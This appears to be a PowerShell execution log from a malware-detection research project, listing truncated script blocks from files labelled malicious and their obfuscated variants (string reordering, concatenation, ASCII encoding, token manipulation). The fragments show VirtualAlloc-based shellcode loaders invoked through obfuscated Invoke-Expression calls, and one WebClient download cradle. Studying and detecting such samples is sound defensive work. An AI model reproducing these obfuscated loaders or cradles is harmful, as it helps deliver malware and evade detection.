"8/6/2026 9:54:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1283.ps1","2373","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:54:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:54:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:54:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:54:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:54:32 AM","","2366","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:54:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1283.ps1","2947"," & ((gV '*mdr*').namE[3,11,2]-jOin'')((((""{22}{39}{1}{34}{31}{3}{9}{2}{4}{16}{43}{26}{5}{46}{12}{28}{49}{25}{40}{11}{37}{32}{41}{14}{6}{36}{17}{48}{38}{0}{13}{19}{20}{35}{18}{15}{8}{42}{30}{29}{27}{44"
"8/6/2026 9:54:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:54:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:54:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:54:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:54:24 AM","","2366","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:54:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1283.ps1","2788"," (('R4Gc '+'= 5Gq[DllImport(Lzkkernel32.dllLzk)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(Lzkkernel32.dllLzk)'+']public "
"8/6/2026 9:54:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:54:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:54:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:54:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:54:16 AM","","2366","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:54:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1283.ps1","10393"," . ((Gv '*MdR*').naMe[3,11,2]-jOIN'') (-jOin[CHAr[]] ( 36, 99, 32 , 61 , 32,39,91,68 , 108 ,108,73 ,109,112, 111 ,114, 116 , 40 ,34 , 107 , 101,114 ,110 ,101 , 108, 51,50 ,46 , 100 , 108 , 108 ,34,41 "
"8/6/2026 9:54:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:54:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:54:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:54:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:54:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1283.ps1","2366","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:54:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:54:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:54:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:54:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:54:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1282.ps1","2690","$ZAl5 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:53:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:53:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:53:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:53:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:53:52 AM","","2683","$ZAl5 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:53:51 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1282.ps1","3442"," ((""{8}{67}{57}{76}{44}{25}{82}{20}{75}{11}{34}{4}{14}{13}{32}{12}{45}{37}{27}{38}{49}{42}{60}{69}{40}{59}{31}{54}{72}{18}{0}{39}{71}{63}{6}{15}{70}{56}{74}{3}{24}{62}{78}{48}{46}{35}{43}{81}{64}{73}{"
"8/6/2026 9:53:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:53:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:53:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:53:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:53:44 AM","","2683","$ZAl5 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:53:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1282.ps1","3017","InVOke-ExpResSioN ( (('Jx6ZAl5 = Bf2[DllImport(wnQkernel32.dllwnQ)]public static extern IntP'+'tr VirtualAl'+'loc(IntPtr lpAddress, uin'+'t dwSize, uin'+'t flAllocationType, uint flProtect);'+'[DllImp"
"8/6/2026 9:53:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:53:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:53:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:53:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:53:36 AM","","2683","$ZAl5 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:53:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1282.ps1","22","{([INT]$_ -As[chaR]) }"
"8/6/2026 9:53:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1282.ps1","9160"," -joiN('36k90{65&108k53:32:61!32!39:91U68D108:108{73~109D112&111k114_116U40&34!107_101:114!110_101:108U51~50U46&100~108U108!34~41U93{112k117_98U108&105U99k32:115{116_97!116:105U99~32}101D120~116U101~1"
"8/6/2026 9:53:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:53:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:53:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:53:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:53:27 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1282.ps1","2683","$ZAl5 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 9:53:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:53:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:53:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:53:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:53:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\128.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:53:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:53:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:53:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:53:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:53:11 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:53:11 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\128.ps1","2795"," & ((GET-VARIAbLE '*mdr*').NaMe[3,11,2]-JOiN'') ((((""{7}{18}{25}{40}{9}{30}{16}{13}{45}{24}{17}{12}{21}{19}{41}{1}{29}{4}{26}{14}{38}{33}{11}{36}{43}{22}{42}{23}{34}{37}{35}{5}{28}{0}{32}{3}{15}{39}{4"
"8/6/2026 9:53:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:53:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:53:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:53:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:53:03 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:53:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\128.ps1","2576","(('4SIc = dyv[D'+'llImport(5Uikernel32.dll5Ui)]public static extern IntPtr VirtualAlloc(IntPtr lpA'+'ddress, uint dwSize, uint flAllocationType, uint flProtect);'+'[DllImport(5Uikernel32.dll5Ui)]publ'"
"8/6/2026 9:52:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:52:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:52:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:52:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:52:56 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:52:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\128.ps1","19","{ ([CHAr][InT] $_)}"
"8/6/2026 9:52:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\128.ps1","7598"," .( $eNV:cOmSpec[4,15,25]-JOin'') ( [sTriNG]::JoiN( '',( '36y99W32G61G32&39k91k68;108,108&73x109;112G111&114;116C40x34x107C101P114C110k101;108W51;50W46k100P108C108,34W41G93&112y117x98C108x105C99C32G11"
"8/6/2026 9:52:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:52:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:52:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:52:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:52:47 AM","C:\TA\project-ta\data_spliting\test_set\malicious\128.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:52:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:52:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:52:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:52:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:52:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1249.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:52:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:52:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:52:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:52:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:52:31 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:52:31 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1249.ps1","2959","iEx( ((""{36}{48}{12}{42}{22}{16}{47}{61}{24}{30}{35}{6}{67}{38}{46}{41}{64}{11}{45}{62}{17}{7}{56}{3}{21}{34}{53}{60}{23}{8}{59}{65}{44}{10}{28}{51}{26}{58}{52}{25}{19}{15}{29}{54}{43}{1}{33}{32}{13}{"
"8/6/2026 9:52:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:52:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:52:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:52:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:52:23 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:52:23 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1249.ps1","2680",". ( ([STrinG]$vErbOsEprefErEnCe)[1,3]+'x'-JoiN'') (('OoEc = kq5[DllImport(Ycvkernel32.dllYcv'+')]public static extern IntPtr '+'VirtualAlloc(IntPtr lpAddress, uint dwSize, u'+'int flAllocationType, ui"
"8/6/2026 9:52:15 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:52:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:52:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:52:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:52:15 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:52:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1249.ps1","20","{ ([CHaR] [iNt] $_)}"
"8/6/2026 9:52:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1249.ps1","7580",". ( $PsHomE[21]+$pshomE[34]+'X')(-jOIN ( '36Z99:32,61~32~39P91:68P108U108{73O109;112,111,114,116O40,34Z107{101;114;110{101P108Z51P50;46~100~108Z108~34P41,93;112U117~98{108U105U99,32{115,116:97O116;105"
"8/6/2026 9:52:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:52:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:52:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:52:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:52:07 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1249.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:51:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:51:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:51:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:51:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1248.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:51:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:51:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:51:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:51:51 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:51 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1248.ps1","2828"," ((""{12}{29}{37}{7}{46}{5}{24}{1}{15}{23}{33}{39}{20}{38}{21}{10}{44}{36}{22}{32}{34}{27}{17}{13}{9}{2}{45}{4}{18}{28}{31}{30}{40}{3}{19}{14}{43}{11}{16}{0}{6}{35}{41}{25}{42}{26}{8}"" -f'x40,0x68,0x00"
"8/6/2026 9:51:43 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:51:43 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:51:43 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:51:43 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:51:43 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1248.ps1","2578","IeX ( ('ap4c = POl[DllImport(pRnkernel32.dllpRn)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, ui'+'nt flProtect);[DllImport(pRnkernel32.dllpRn)]publ'+"
"8/6/2026 9:51:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:51:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:51:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:51:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:51:35 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1248.ps1","22","{( [iNt]$_-as [cHaR])}"
"8/6/2026 9:51:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1248.ps1","7558","-jOIN ('36;99l32;61m32;39~91;68~108<108_73_109l112~111~114<116;40~34;107_101d114;110y101%108~51_50l46<100d108~108%34~41m93~112y117y98%108_105_99~32:115l116%97;116y105~99l32_101~120%116;101d114;110_32%"
"8/6/2026 9:51:27 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:51:27 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:51:27 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:51:27 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:51:27 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1248.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:19 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:51:19 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:51:19 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:51:19 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:51:19 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1241.ps1","2236","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:11 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:51:11 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:51:11 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:51:11 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:51:11 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:11 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1241.ps1","2949","&( $ShelliD[1]+$SHellid[13]+'x') (((""{40}{63}{20}{67}{21}{46}{65}{64}{1}{39}{19}{48}{13}{56}{31}{26}{44}{61}{30}{14}{34}{38}{47}{9}{22}{17}{4}{52}{69}{3}{66}{57}{43}{50}{28}{37}{58}{6}{62}{23}{53}{35}"
"8/6/2026 9:51:03 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:51:03 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:51:03 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:51:03 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:51:03 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:51:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1241.ps1","2594"," ('BvEc = muj[DllImport(Gu9kernel32.dllGu9)]public static extern IntPtr Virtu'+'alAlloc(IntPtr lpAddress, uint dwS'+'ize, uint flAllocationType, uint flProtect);[DllImport(Gu9kernel32.dllGu9)]public s"
"8/6/2026 9:50:55 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:50:55 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:50:55 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:50:55 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:50:55 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:50:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1241.ps1","23","{([INt] $_ -as[CHar]) }"
"8/6/2026 9:50:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1241.ps1","7677"," -JOIn( '36f99H32{61&32r39f91W68-108f108W73_109W112r111d114&116-40-34{107d101{114d110_101_108d51d50}46{100d108&108-34&41f93_112&117W98_108}105d99f32r115W116&97&116f105_99{32_101r120f116_101W114d110-32"
"8/6/2026 9:50:47 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:50:47 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:50:47 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:50:47 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:50:47 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1241.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:50:39 AM","","9","$global:?"
"8/6/2026 9:50:39 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:50:39 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:50:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:50:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:50:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1208.ps1","454","$wC=nE`W-`obJEct SYstem.NEt.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdeRS.Add('User-Agent',$u);$wC.PROXY = [SYstEm.NET.WebREQuEST]::DEFaultWEbProxY;$w"
"8/6/2026 9:50:32 AM","","9","$global:?"
"8/6/2026 9:50:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:50:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:50:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:50:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
